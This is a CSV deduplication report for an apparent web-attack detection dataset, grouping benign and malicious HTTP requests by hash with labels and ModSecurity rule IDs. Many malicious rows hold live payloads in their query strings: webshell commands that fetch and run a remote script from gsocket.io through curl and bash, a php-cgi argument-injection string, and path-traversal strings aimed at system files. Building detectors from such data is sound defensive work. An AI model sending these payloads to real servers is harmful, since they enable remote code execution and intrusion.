"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"canonical_raw_request_hash","4d422c7b453ec08c74aa3d2e","85","0","csic_2010","csic_normal","norm_csic_000518|norm_csic_000195|norm_csic_000583|norm_csic_000304|norm_csic_000160|norm_csic_002711|norm_csic_002524|norm_csic_000872|norm_csic_000303|norm_csic_002039","GET","/tienda1/publico/vaciar.jsp","B2=Vaciar+carrito"
"canonical_raw_request_hash","f8eda1410bca32ce174e592a","85","0","csic_2010","csic_normal","norm_csic_002544|norm_csic_000309|norm_csic_000760|norm_csic_000980|norm_csic_000641|norm_csic_002443|norm_csic_002158|norm_csic_002226|norm_csic_002404|norm_csic_000973","GET","/tienda1/imagenes/cmenbul.gif",""
"canonical_raw_request_hash","7423a59c0fd6516151c7e87b","84","0","csic_2010","csic_normal","norm_csic_000581|norm_csic_001955|norm_csic_001971|norm_csic_000257|norm_csic_002184|norm_csic_000134|norm_csic_000123|norm_csic_002868|norm_csic_000649|norm_csic_002188","POST","/tienda1/publico/vaciar.jsp",""
"canonical_raw_request_hash","85d9f5144e627982817eb03f","83","0","csic_2010","csic_normal","norm_csic_002600|norm_csic_000895|norm_csic_001812|norm_csic_000108|norm_csic_002129|norm_csic_002106|norm_csic_002893|norm_csic_000196|norm_csic_000617|norm_csic_000825","GET","/tienda1/miembros/index.jsp",""
"canonical_raw_request_hash","59832325f7390bf0756e5eaa","81","0","csic_2010","csic_normal","norm_csic_000140|norm_csic_000072|norm_csic_001181|norm_csic_001391|norm_csic_000162|norm_csic_002830|norm_csic_000525|norm_csic_000524|norm_csic_002923|norm_csic_001585","GET","/tienda1/miembros/fotos.jsp",""
"canonical_raw_request_hash","1a620a2c13f8d9320a45131f","80","0","csic_2010","csic_normal","norm_csic_002956|norm_csic_002699|norm_csic_002844|norm_csic_001466|norm_csic_000909|norm_csic_001457|norm_csic_002055|norm_csic_001589|norm_csic_000744|norm_csic_002388","GET","/tienda1/publico/carrito.jsp",""
"canonical_raw_request_hash","8be5f03126ce745726a85879","80","0","csic_2010","csic_normal","norm_csic_000478|norm_csic_002591|norm_csic_000704|norm_csic_001800|norm_csic_002256|norm_csic_000538|norm_csic_001912|norm_csic_000600|norm_csic_001142|norm_csic_002014","GET","/tienda1/imagenes/1.gif",""
"canonical_raw_request_hash","0048b978b57635e23aa25e0f","77","0","csic_2010","csic_normal","norm_csic_002945|norm_csic_002653|norm_csic_000497|norm_csic_001189|norm_csic_001836|norm_csic_002997|norm_csic_002922|norm_csic_000006|norm_csic_001849|norm_csic_001622","GET","/tienda1/index.jsp",""
"canonical_raw_request_hash","646ad9e40d03125fb82ac6be","75","0","csic_2010","csic_normal","norm_csic_002559|norm_csic_001452|norm_csic_002363|norm_csic_001870|norm_csic_002948|norm_csic_002433|norm_csic_001623|norm_csic_002287|norm_csic_001652|norm_csic_002827","GET","/tienda1/global/estilos.css",""
"canonical_raw_request_hash","06178b5722caae7cc59189bc","73","0","csic_2010","csic_normal","norm_csic_000422|norm_csic_001895|norm_csic_001659|norm_csic_002696|norm_csic_002753|norm_csic_002034|norm_csic_001067|norm_csic_001703|norm_csic_001785|norm_csic_002291","GET","/tienda1/imagenes/2.gif",""
"canonical_raw_request_hash","7abd23046c9549a17a322408","70","0","csic_2010","csic_normal","norm_csic_002260|norm_csic_001201|norm_csic_000721|norm_csic_000795|norm_csic_000706|norm_csic_000428|norm_csic_001236|norm_csic_002698|norm_csic_001408|norm_csic_002489","GET","/tienda1/miembros/imagenes/castro.jpg",""
"canonical_raw_request_hash","287c8df58ebfaf7d0f244a5f","54","0|1","csic_2010","csic_anomalous|csic_normal","norm_csic_001174|norm_csic_000338|norm_csic_000129|norm_csic_000441|norm_csic_000200|norm_csic_000091|norm_csic_002368|norm_csic_000295|norm_csic_000618|norm_csic_001945","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","94f0bdeaf875f3340cdb372c","45","0","csic_2010","csic_normal","norm_csic_001678|norm_csic_001675|norm_csic_001303|norm_csic_002270|norm_csic_000967|norm_csic_002093|norm_csic_001397|norm_csic_002329|norm_csic_002458|norm_csic_001260","GET","/tienda1/publico/caracteristicas.jsp","id=2"
"canonical_raw_request_hash","090c72f228666a00c4c7516d","42","0","csic_2010","csic_normal","norm_csic_002320|norm_csic_002379|norm_csic_001783|norm_csic_000882|norm_csic_000089|norm_csic_000567|norm_csic_000216|norm_csic_001007|norm_csic_001421|norm_csic_001035","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","e3836c37d0c906257118381a","36","0","csic_2010","csic_normal","norm_csic_000930|norm_csic_000202|norm_csic_000733|norm_csic_000058|norm_csic_002156|norm_csic_002550|norm_csic_001146|norm_csic_001541|norm_csic_001251|norm_csic_002240","GET","/tienda1/publico/caracteristicas.jsp","id=1"
"canonical_raw_request_hash","0fcb17a2a9a516d7d6eb9f27","27","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_000105|pos_owasp_modsec_002205|pos_owasp_modsec_001918|pos_owasp_modsec_002905|pos_owasp_modsec_001606|pos_owasp_modsec_001591|pos_owasp_modsec_001045|pos_owasp_modsec_002277|pos_owasp_modsec_001439|pos_owasp_modsec_002357","POST","/d_c8655413",""
"canonical_raw_request_hash","e649ac61425020b11431e00d","27","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002432|pos_owasp_modsec_001388|pos_owasp_modsec_002346|pos_owasp_modsec_002013|pos_owasp_modsec_001427|pos_owasp_modsec_000604|pos_owasp_modsec_001061|pos_owasp_modsec_001493|pos_owasp_modsec_001152|pos_owasp_modsec_001284","POST","/d_43826a23",""
"canonical_raw_request_hash","447e441b8c3d8bfa4e40c1f2","18","1","csic_2010","csic_anomalous","pos_csic_002120|pos_csic_001822|pos_csic_002874|pos_csic_000506|pos_csic_001884|pos_csic_002028|pos_csic_001504|pos_csic_000165|pos_csic_000321|pos_csic_001395","POST","/tienda1/publico/entrar.jsp",""
"canonical_raw_request_hash","328dafb986911cfd82ad68e0","17","1","owasp_modsecurity","owasp_php_injection:933100|owasp_sqli:932115|owasp_sqli:933160|owasp_sqli:942100|owasp_sqli:942280","pos_owasp_modsec_000511|pos_owasp_modsec_000960|pos_owasp_modsec_002458|pos_owasp_modsec_001470|pos_owasp_modsec_001502|pos_owasp_modsec_002376|pos_owasp_modsec_001247|pos_owasp_modsec_000393|pos_owasp_modsec_002425|pos_owasp_modsec_001087","POST","/wp-login.php",""
"canonical_raw_request_hash","1aa5cc6113673d42c6227bee","15","1","csic_2010","csic_anomalous","pos_csic_001650|pos_csic_002311|pos_csic_001623|pos_csic_000311|pos_csic_000996|pos_csic_000039|pos_csic_001832|pos_csic_001606|pos_csic_001512|pos_csic_001580","POST","/tienda1/publico/vaciar.jsp",""
"canonical_raw_request_hash","20cb2c6c9a9d2fd2da3be1bd","14","1","csic_2010","csic_anomalous","pos_csic_002452|pos_csic_002693|pos_csic_001291|pos_csic_001949|pos_csic_000679|pos_csic_000139|pos_csic_000146|pos_csic_001275|pos_csic_001104|pos_csic_001993","GET","/tienda1/publico/vaciar.jsp","B2A=Vaciar+carrito"
"canonical_raw_request_hash","c05ec66e0b66c4f6c001c110","12","1","owasp_modsecurity","owasp_php_injection:933120","pos_owasp_modsec_001297|pos_owasp_modsec_002216|pos_owasp_modsec_002067|pos_owasp_modsec_000008|pos_owasp_modsec_001292|pos_owasp_modsec_000693|pos_owasp_modsec_000508|pos_owasp_modsec_001384|pos_owasp_modsec_002745|pos_owasp_modsec_001738","GET","/d_442cf7a4/php-cgi.exe","%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
"canonical_raw_request_hash","00fefdb40773802d097af614","9","1","owasp_modsecurity","owasp_sqli:933160|owasp_sqli:942100","pos_owasp_modsec_000450|pos_owasp_modsec_000822|pos_owasp_modsec_001574|pos_owasp_modsec_000561|pos_owasp_modsec_001064|pos_owasp_modsec_001129|pos_owasp_modsec_001687|pos_owasp_modsec_001642|pos_owasp_modsec_000173","POST","/d_7dd3b010",""
"canonical_raw_request_hash","513040e6d74d0bdde61025a7","9","1","csic_2010","csic_anomalous","pos_csic_000824|pos_csic_000796|pos_csic_002284|pos_csic_001145|pos_csic_002910|pos_csic_002630|pos_csic_002649|pos_csic_001966|pos_csic_002904","GET","/tienda1/publico/entrar.jsp","errorMsgA=Credenciales+incorrectas"
"canonical_raw_request_hash","8b25919202f55fa6dadb7fda","9","1","csic_2010","csic_anomalous","pos_csic_000670|pos_csic_000566|pos_csic_001187|pos_csic_001149|pos_csic_002864|pos_csic_001203|pos_csic_001781|pos_csic_002259|pos_csic_002343","GET","/tienda1/publico/caracteristicas.jsp","idA=2"
"canonical_raw_request_hash","0e208d1134eb3b38a869c6dc","8","1","csic_2010","csic_anomalous","pos_csic_000194|pos_csic_002291|pos_csic_002839|pos_csic_002301|pos_csic_002651|pos_csic_000014|pos_csic_001852|pos_csic_001873","GET","/tienda1/publico/caracteristicas.jsp","idA=1"
"canonical_raw_request_hash","0e9a8e80d92c3e276091cac9","8","1","csic_2010","csic_anomalous","pos_csic_000233|pos_csic_002723|pos_csic_002807|pos_csic_001329|pos_csic_002345|pos_csic_002857|pos_csic_000542|pos_csic_000141","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","40536da3953981b0d6b895f0","8","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002038|pos_owasp_modsec_002379|pos_owasp_modsec_001972|pos_owasp_modsec_001408|pos_owasp_modsec_002063|pos_owasp_modsec_001771|pos_owasp_modsec_001251|pos_owasp_modsec_000015","GET","/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","08c89441a4c0a7d29b648ddf","7","1","csic_2010","csic_anomalous","pos_csic_002557|pos_csic_001159|pos_csic_000891|pos_csic_001741|pos_csic_000569|pos_csic_000895|pos_csic_001649","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","24e13ed1ab19a13352c7990b","7","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001342|pos_owasp_modsec_002398|pos_owasp_modsec_000557|pos_owasp_modsec_001291|pos_owasp_modsec_000334|pos_owasp_modsec_001902|pos_owasp_modsec_001240","GET","/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","8e39c9ea9419ce807c2834bf","7","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000971|pos_owasp_modsec_000488|pos_owasp_modsec_000274|pos_owasp_modsec_000186|pos_owasp_modsec_001506|pos_owasp_modsec_001625|pos_owasp_modsec_000252","GET","/d_873adb73/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e94d719188ad5b7fbc7f3533","7","1","owasp_modsecurity","owasp_php_injection:933100|owasp_sqli:942100","pos_owasp_modsec_000798|pos_owasp_modsec_002466|pos_owasp_modsec_002114|pos_owasp_modsec_001722|pos_owasp_modsec_002763|pos_owasp_modsec_001381|pos_owasp_modsec_002343","POST","/wp-login.php",""
"canonical_raw_request_hash","3b06ed859bed184393b2cc8b","6","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001102|pos_owasp_modsec_000841|pos_owasp_modsec_001540|pos_owasp_modsec_000473|pos_owasp_modsec_000530|pos_owasp_modsec_000154","GET","/d_ebec15cd/d_eda37985/d_9a52310f/d_a9b36e7e/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","b827f966308ba568ae9cf96d","6","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002484|pos_owasp_modsec_001539|pos_owasp_modsec_002451|pos_owasp_modsec_001907|pos_owasp_modsec_002284|pos_owasp_modsec_002666","GET","/d_e08f6bed/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","ba1575204124346fb086588b","6","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_001378|pos_owasp_modsec_000127|pos_owasp_modsec_000074|pos_owasp_modsec_002494|pos_owasp_modsec_000469|pos_owasp_modsec_000625","POST","/wp-plain.php",""
"canonical_raw_request_hash","05cbdf1a7331989cbfe4c1fe","5","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000609|pos_owasp_modsec_001407|pos_owasp_modsec_002005|pos_owasp_modsec_002014|pos_owasp_modsec_000550","GET","/d_e08f6bed/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","7c845097cbfe31bca33a39d5","5","1","owasp_modsecurity","owasp_xss:920350","pos_owasp_modsec_002235|pos_owasp_modsec_000794|pos_owasp_modsec_001482|pos_owasp_modsec_000165|pos_owasp_modsec_002658","GET","/d_c93247f7/d_ecaae2d5/d_6f32dc28/d_9dde1872",""
"canonical_raw_request_hash","d3adce0e6392252c74740c92","5","1","owasp_modsecurity","owasp_php_injection:933100|owasp_sqli:942100","pos_owasp_modsec_002631|pos_owasp_modsec_001673|pos_owasp_modsec_002808|pos_owasp_modsec_000756|pos_owasp_modsec_001210","POST","/wp-login.php",""
"canonical_raw_request_hash","da9ceb5a105562b617b368d1","5","1","owasp_modsecurity","owasp_php_injection:933100","pos_owasp_modsec_001248|pos_owasp_modsec_001235|pos_owasp_modsec_001463|pos_owasp_modsec_001339|pos_owasp_modsec_002112","POST","/wp-login.php",""
"canonical_raw_request_hash","03e69db3e13714905bb2cc06","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002390|pos_owasp_modsec_000142|pos_owasp_modsec_002613|pos_owasp_modsec_001893","GET","/d_44424c43/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","274de134ceb5a0bdfa972bb5","4","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002574|pos_owasp_modsec_001027|pos_owasp_modsec_001467|pos_owasp_modsec_000636","POST","/","wc-ajax=aws_action"
"canonical_raw_request_hash","4130a84bcb04f07658d3719c","4","1","csic_2010","csic_anomalous","pos_csic_002420|pos_csic_002852|pos_csic_000754|pos_csic_000425","GET","/tienda1/asf-logo-wide.gif",""
"canonical_raw_request_hash","5008f63945eddb26ab8ebf88","4","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_001158|pos_owasp_modsec_002881|pos_owasp_modsec_000275|pos_owasp_modsec_002935","GET","/.env",""
"canonical_raw_request_hash","6feebced477bb9c0fbe0a496","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000050|pos_owasp_modsec_000078|pos_owasp_modsec_001781|pos_owasp_modsec_002571","GET","/d_873adb73/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","7638b0658c1318d59b5cb1be","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002937|pos_owasp_modsec_001783|pos_owasp_modsec_001307|pos_owasp_modsec_002419","GET","/d_eda37985/d_3487ae30/mod_webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","82a1042bee9b04022d693a47","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001816|pos_owasp_modsec_000365|pos_owasp_modsec_000832|pos_owasp_modsec_000049","GET","/exec.php","exec=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","90262c08e5ff08e1878d9bcb","4","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002188|pos_owasp_modsec_002785|pos_owasp_modsec_000073|pos_owasp_modsec_000987","POST","/wp-login.php","action=lostpassword"
"canonical_raw_request_hash","99f20ebb36bcee703458340f","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001773|pos_owasp_modsec_002923|pos_owasp_modsec_002609|pos_owasp_modsec_001141","GET","/d_44424c43/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","b32a3459421788b5b82266ee","4","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000836|pos_owasp_modsec_001998|pos_owasp_modsec_002148|pos_owasp_modsec_001717","GET","/d_aef1eb87/d_26833b49/d_69e31438/d_7f42b05b/pum-site-scripts.js",""
"canonical_raw_request_hash","b75d8552257610df8bf5c385","4","1","csic_2010","csic_anomalous","pos_csic_002204|pos_csic_000921|pos_csic_001934|pos_csic_000673","GET","/tienda1.Old",""
"canonical_raw_request_hash","c5c08b50e1d7842daa78b909","4","1","owasp_modsecurity","owasp_sqli:932115|owasp_sqli:942100","pos_owasp_modsec_001757|pos_owasp_modsec_000019|pos_owasp_modsec_001934|pos_owasp_modsec_001588","POST","/wp-login.php","reauth=1&redirect_to=https://df7754e.hu/wp-admin/"
"canonical_raw_request_hash","07a8a7cab650a725d326fc9c","3","1","csic_2010","csic_anomalous","pos_csic_002518|pos_csic_002854|pos_csic_000315","GET","/tienda1/publico/anadir.jsp.java",""
"canonical_raw_request_hash","250bd34534f1beb815813160","3","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_002136|pos_owasp_modsec_000491|pos_owasp_modsec_000553","POST","/wp-plain.php",""
"canonical_raw_request_hash","32ad66fbff194f3faf1a5dea","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002956|norm_modsec_learn_000835|norm_modsec_learn_000834","GET","/","key=PRESENT"
"canonical_raw_request_hash","497e214db604927409768c6f","3","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_002825|pos_owasp_modsec_002252|pos_owasp_modsec_002455","GET","/isotope.js",""
"canonical_raw_request_hash","5fc200d44f3194b7e9e6ffea","3","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001994|pos_owasp_modsec_001065|pos_owasp_modsec_001537","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","95d8a4faafebe07c16c51dc2","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000663|pos_owasp_modsec_001449|pos_owasp_modsec_001369","GET","/d_1dfbfc8b/d_ebec15cd/d_eda37985/d_9a52310f/d_a9b36e7e/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","c982bd8039f13972a33db411","3","1","owasp_modsecurity","owasp_xss:933110","pos_owasp_modsec_000375|pos_owasp_modsec_001074|pos_owasp_modsec_001353","POST","/d_21316fde/d_5737eae1/class-plugin-installer-skin-wp.php","beta=my-db.com/3"
"canonical_raw_request_hash","cc6ba957f2fdc88ed96853bb","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000169|pos_owasp_modsec_001701|pos_owasp_modsec_001399","GET","/d_eda37985/d_4ed974d3/d_64c9c797/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e345453ef3647f8546103af7","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000258|pos_owasp_modsec_002413|pos_owasp_modsec_000728","GET","/d_eda37985/d_4ff6ca68/d_4ff6ca68/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e44f85f8ffeb005958509eca","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002412|pos_owasp_modsec_000612|pos_owasp_modsec_001900","GET","/cmd.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e8f504d40eb0da4a7f54129c","3","1","csic_2010","csic_anomalous","pos_csic_001635|pos_csic_002393|pos_csic_000741","GET","/.jsp",""
"canonical_raw_request_hash","03aa0b2f3dfd1945ce5f4615","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_000352|pos_owasp_modsec_001908","POST","/wp-plain.php",""
"canonical_raw_request_hash","05a8e8de967accf8845f7729","2","1","csic_2010","csic_anomalous","pos_csic_002678|pos_csic_001231","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","0e6d09b7047d7d06c4ee3c91","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_000305|pos_owasp_modsec_002606","POST","/wp-plain.php",""
"canonical_raw_request_hash","0e9feb05878b2f307f4488d6","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001100|norm_modsec_learn_001715","GET","/","v=6434&nid=2149&put=k-lxxHgrZUbJO_PUPloiptXoiUjmrc5aLTjZFf8A&expires=30"
"canonical_raw_request_hash","1cf83d2fc04f02880adfc56e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001203|norm_modsec_learn_001828","GET","/","appVersion=953&experienceVersion=953&uxid=com.nike.commerce.nikedotcom.web&locale=en_IL&backendEnvironment=identity&browser=Google%20Inc.&os=undefined&mobile=false&native=false&visit=1&visitor=2bac7ee2-6167-4dd0-9152-f278d455aec7&upmId=ffa85996-ca6e-4340-8463-aabd984bf5ac"
"canonical_raw_request_hash","2568bef9798b4b65dd1de037","2","1","csic_2010","csic_anomalous","pos_csic_001048|pos_csic_001266","GET","/IISSamples/sdk/asp/applications/Application_VBScript.asp",""
"canonical_raw_request_hash","3485c4bc57572e763e97dcce","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001445|pos_owasp_modsec_000694","GET","/wp-includesSimplePiegzdecodes.php",""
"canonical_raw_request_hash","374b39195bcf8417e62538e4","2","1","openappsec_malicious","traversal","pos_malicious_002508|pos_malicious_002380","GET","/","p=.%00.%c1%af.%00.%c1%afboot.ini"
"canonical_raw_request_hash","391c797044f710201d23450f","2","1","openappsec_malicious","traversal","pos_malicious_002377|pos_malicious_002481","GET","/","p=.%00.%c0%af.%00.%c0%af.%00.%c0%afetc%c0%afissue"
"canonical_raw_request_hash","43353d1874d46567dcc2ce1c","2","1","csic_2010","csic_anomalous","pos_csic_002759|pos_csic_001116","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","44d22ef0d362e22c6e978a0c","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_000345|pos_owasp_modsec_000535","GET","/apps/.env",""
"canonical_raw_request_hash","4ae99d79f4ddc8f1224b8e1b","2","1","openappsec_malicious","traversal","pos_malicious_003001|pos_malicious_003025","GET","/","p=..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts"
